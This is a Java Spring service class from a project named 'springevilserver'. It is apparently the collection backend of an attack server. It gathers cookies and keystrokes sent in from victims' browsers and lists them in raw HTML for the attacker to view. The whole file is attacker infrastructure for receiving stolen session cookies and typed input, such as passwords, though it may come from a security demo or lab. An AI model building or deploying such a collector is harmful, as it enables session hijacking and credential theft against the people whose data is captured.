package com.example.springevilserver;

import org.springframework.stereotype.Service;

import java.util.ArrayList;
import java.util.List;

@Service
public class DataCollectService {

    private List<String> cookieList = new ArrayList<>();
    private List<String> keyStrokeList = new ArrayList<>();

    public void addCookie(String cookieString){
        this.cookieList.add(cookieString);
    }
    public void addKeyStroke(String keyStrokeString){
        this.keyStrokeList.add(keyStrokeString);
    }

    public String cookiesToString(){
        String cookieListString = "<h4>Cookies received:</h4><br>";
        for(String cookie : cookieList){
            cookieListString = cookieListString + cookie + "<br>";
        }
        return cookieListString;
    }

    public String keyStrokesToString(){
        String keyStrokeListString = "<h4>KeyStrokes received:</h4><br>";
        for(String keyStroke : keyStrokeList){
            keyStrokeListString = keyStrokeListString + keyStroke + "<br>";
        }
        return keyStrokeListString;
    }
}
